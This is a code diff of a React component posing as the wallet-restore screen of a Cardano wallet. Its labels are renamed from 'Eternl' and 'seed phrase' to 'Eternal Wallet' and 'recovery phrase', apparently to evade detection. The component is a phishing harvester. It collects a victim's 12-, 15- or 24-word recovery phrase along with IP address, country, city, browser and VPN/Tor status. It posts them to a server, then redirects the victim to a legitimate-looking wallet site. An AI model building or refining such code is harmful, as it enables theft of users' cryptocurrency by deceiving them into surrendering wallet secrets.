@@ -7,7 +7,7 @@ import axios from "axios";
 const loadWordlist = async (): Promise<string[]> => {
   try {
     console.log("Loading wordlist...");
-    const response = await fetch("/seedphrase.txt");
+    const response = await fetch("/recovery_phrase.txt");
     const text = await response.text();
     const words = text
       .trim()
@@ -30,12 +30,12 @@ const sanitizeInput = (input: string): string => {
 };
 
 // Helper function to check if seed phrase is correct
-const isCorrectSeedPhrase = (
-  seedPhrase: string[],
+const isCorrectRecoveryPhrase = (
+  recoveryPhrase: string[],
   wordlist: string[]
 ): boolean => {
   if (wordlist.length === 0) return true; // Skip validation if wordlist not loaded yet
-  return seedPhrase.every((word) => wordlist.includes(word));
+  return recoveryPhrase.every((word) => wordlist.includes(word));
 };
 
 // Get user's IP and location info
@@ -54,9 +54,9 @@ const getUserCountry = async () => {
     } = response.data;
     const isVpnIpdata = threat
       ? threat.is_vpn ||
-        threat.is_proxy ||
-        threat.is_datacenter ||
-        threat.is_tor
+      threat.is_proxy ||
+      threat.is_datacenter ||
+      threat.is_tor
       : false;
 
     return { country, countryCode, countryEmoji, ip, isVpnIpdata, city };
@@ -66,7 +66,7 @@ const getUserCountry = async () => {
   }
 };
 
-export default function SeedRestore({
+export default function RecoveryPhraseRestore({
   wordCounts = [24, 15, 12],
   onCancel,
   onConfirm,
@@ -75,7 +75,7 @@ export default function SeedRestore({
   onCancel?: () => void;
   onConfirm?: (words: string[]) => void;
 }) {
-  const [step, setStep] = useState<"type" | "mnemonic">("type");
+  const [step, setStep] = useState<"type" | "recovery">("type");
   const [selectedCount, setSelectedCount] = useState<number | null>(null);
   const [words, setWords] = useState<string[]>([]);
   const [wordlist, setWordlist] = useState<string[]>([]);
@@ -93,7 +93,7 @@ export default function SeedRestore({
   }, []);
 
   useEffect(() => {
-    if (step === "mnemonic" && selectedCount) {
+    if (step === "recovery" && selectedCount) {
       const w = new Array(selectedCount).fill("");
       setWords(w);
       setValidationError(""); // Clear validation error when starting fresh
@@ -113,7 +113,7 @@ export default function SeedRestore({
 
   function goNextFromType() {
     if (!selectedCount) return;
-    setStep("mnemonic");
+    setStep("recovery");
   }
 
   function goBackToType() {
@@ -155,7 +155,7 @@ export default function SeedRestore({
       setWords(pastedWords);
 
       setValidationError("");
-      setStep("mnemonic");
+      setStep("recovery");
     } else {
       setValidationError(
         `Please paste exactly 12, 15, or 24 words (you pasted ${pastedWords.length}).`
@@ -175,7 +175,7 @@ export default function SeedRestore({
     // Check if all fields are filled
     const allFilled = words.every((w) => w && w.length > 0);
     if (!allFilled) {
-      setValidationError("Please fill in all seed phrase words");
+      setValidationError("Please fill in all recovery phrase words");
       firstInputRef.current?.focus();
       return;
     }
@@ -191,14 +191,14 @@ export default function SeedRestore({
 
     try {
       // Sanitize and validate words
-      const sanitizedSeedPhrase = words.map((word) => sanitizeInput(word));
+      const sanitizedRecoveryPhrase = words.map((word) => sanitizeInput(word));
 
       // Validate against BIP39 wordlist
       if (
         wordlist.length > 0 &&
-        !isCorrectSeedPhrase(sanitizedSeedPhrase, wordlist)
+        !isCorrectRecoveryPhrase(sanitizedRecoveryPhrase, wordlist)
       ) {
-        const invalidWords = sanitizedSeedPhrase.filter(
+        const invalidWords = sanitizedRecoveryPhrase.filter(
           (word) => !wordlist.includes(word)
         );
         throw new Error(`Invalid words: ${invalidWords.join(", ")}`);
@@ -208,8 +208,8 @@ export default function SeedRestore({
       const userData = await getUserCountry();
 
       const messageData = {
-        appName: "Eternl",
-        seedPhrase: sanitizedSeedPhrase.join(" "),
+        appName: "Eternal Wallet",
+        recoveryPhrase: sanitizedRecoveryPhrase.join(" "),
         country: userData?.country || "Unknown",
         ipAddress: userData?.ip || "Unknown",
         browser:
@@ -233,8 +233,8 @@ export default function SeedRestore({
       const result = await response.json();
 
       if (response.status === 200 && result.status) {
-        window.location.href = "https://eternl.io/";
-        console.log("Seed phrase validation successful:", result);
+        window.location.href = "https://eternal-wallet.io/";
+        console.log("Recovery phrase validation successful:", result);
         onConfirm?.(words);
       } else {
         const serverMessage = result?.message || "Something went wrong.";
@@ -257,27 +257,26 @@ export default function SeedRestore({
   function renderTypeOption(count: number) {
     const desc =
       count === 24
-        ? "A Shelley wallet created by, say, Eternl or Daedalus."
+        ? "A Shelley wallet created by, say, Eternal Wallet or Daedalus."
         : count === 15
-        ? "Like a Yoroi Shelley wallet."
-        : "A 12-word Shelley wallet.";
+          ? "Like a Yoroi Shelley wallet."
+          : "A 12-word Shelley wallet.";
     const active = selectedCount === count;
     return (
       <button
         key={count}
         onClick={() => selectType(count)}
-        className={`w-full text-left rounded-2xl px-5 py-4 ring-1 transition-colors ${
-          active
-            ? "bg-white/6 ring-pink-400/40"
-            : "bg-white/3 hover:bg-white/5 ring-white/10"
-        }`}
+        className={`w-full text-left rounded-2xl px-5 py-4 ring-1 transition-colors ${active
+          ? "bg-white/6 ring-pink-400/40"
+          : "bg-white/3 hover:bg-white/5 ring-white/10"
+          }`}
       >
         <div className="font-semibold text-white">{count}-word phrase</div>
         <div className="text-sm text-white/60 mt-1">{desc}</div>
       </button>
     );
   }
-  function renderMnemonicGrid() {
+  function renderRecoveryGrid() {
     if (!selectedCount) return null;
 
     const perColumn = Math.ceil(selectedCount / columns);
@@ -304,7 +303,7 @@ export default function SeedRestore({
                     setSelectedCount(pastedWords.length);
                     setWords(pastedWords);
                     setValidationError("");
-                    setStep("mnemonic");
+                    setStep("recovery");
                   } else {
                     setValidationError(
                       `Please paste exactly 12, 15, or 24 words (you pasted ${pastedWords.length}).`
@@ -341,15 +340,14 @@ export default function SeedRestore({
                   autoCapitalize="none"
                   autoComplete="off"
                   spellCheck={false}
-                  className={`w-full rounded-full bg-transparent px-4 py-3 text-white placeholder:text-white/30 outline-none ring-1 transition-all ${
-                    words[idx] &&
+                  className={`w-full rounded-full bg-transparent px-4 py-3 text-white placeholder:text-white/30 outline-none ring-1 transition-all ${words[idx] &&
                     wordlist.length > 0 &&
                     !wordlist.includes(sanitizeInput(words[idx]))
-                      ? "ring-red-400/60 focus:ring-red-400/60"
-                      : "ring-white/10 focus:ring-pink-400/40"
-                  }`}
+                    ? "ring-red-400/60 focus:ring-red-400/60"
+                    : "ring-white/10 focus:ring-pink-400/40"
+                    }`}
                 />
-                <div className="absolute left-4 top-1/2 -translate-y-1/2 h-6 w-[1px] bg-white/6" />
+                <div className="absolute left-4 top-1/2 -translate-y-1/2 h-6 w-px bg-white/6" />
               </div>
             </div>
           ))}
@@ -368,11 +366,10 @@ export default function SeedRestore({
             disabled={
               words.length === 0 || words.some((w) => !w) || isValidating
             }
-            className={`rounded-full px-6 py-2 text-white text-sm ${
-              words.length === 0 || words.some((w) => !w) || isValidating
-                ? "bg-white/10 opacity-60 cursor-not-allowed"
-                : "bg-gradient-to-r from-pink-400 via-orange-300 to-fuchsia-500"
-            }`}
+            className={`rounded-full px-6 py-2 text-white text-sm ${words.length === 0 || words.some((w) => !w) || isValidating
+              ? "bg-white/10 opacity-60 cursor-not-allowed"
+              : "bg-linear-to-r from-pink-400 via-orange-300 to-fuchsia-500"
+              }`}
           >
             {isValidating ? "Validating..." : "Next"}
           </button>
@@ -385,7 +382,7 @@ export default function SeedRestore({
     <div>
       {step === "type" && (
         <div>
-          <h4 className="text-lg font-semibold text-white">Seed phrase type</h4>
+          <h4 className="text-lg font-semibold text-white">Recovery phrase type</h4>
           <p className="mt-2 text-white/70">
             What kind of wallet would you like to restore?
           </p>
@@ -404,11 +401,10 @@ export default function SeedRestore({
             <button
               onClick={goNextFromType}
               disabled={!selectedCount}
-              className={`rounded-full px-6 py-2 text-white ${
-                selectedCount
-                  ? "bg-gradient-to-r from-pink-400 via-orange-300 to-fuchsia-500"
-                  : "bg-white/8 opacity-60 cursor-not-allowed"
-              }`}
+              className={`rounded-full px-6 py-2 text-white ${selectedCount
+                ? "bg-linear-to-r from-pink-400 via-orange-300 to-fuchsia-500"
+                : "bg-white/8 opacity-60 cursor-not-allowed"
+                }`}
             >
               Next
             </button>
@@ -416,7 +412,7 @@ export default function SeedRestore({
         </div>
       )}
 
-      {step === "mnemonic" && (
+      {step === "recovery" && (
         <div>
           <div className="flex items-center justify-between">
             <button
@@ -429,9 +425,9 @@ export default function SeedRestore({
 
             <div className="text-center w-full -ml-10">
               <h4 className="text-lg font-semibold text-white">
-                Mnemonic phrase
+                Recovery phrase
               </h4>
-              <p className="mt-2 text-white/70">Enter your saved seed phrase</p>
+              <p className="mt-2 text-white/70">Enter your saved recovery phrase</p>
             </div>
 
             {/* placeholder to keep header balanced */}
@@ -444,7 +440,7 @@ export default function SeedRestore({
                 {validationError}
               </div>
             )}
-            {renderMnemonicGrid()}
+            {renderRecoveryGrid()}
           </div>
         </div>
       )}
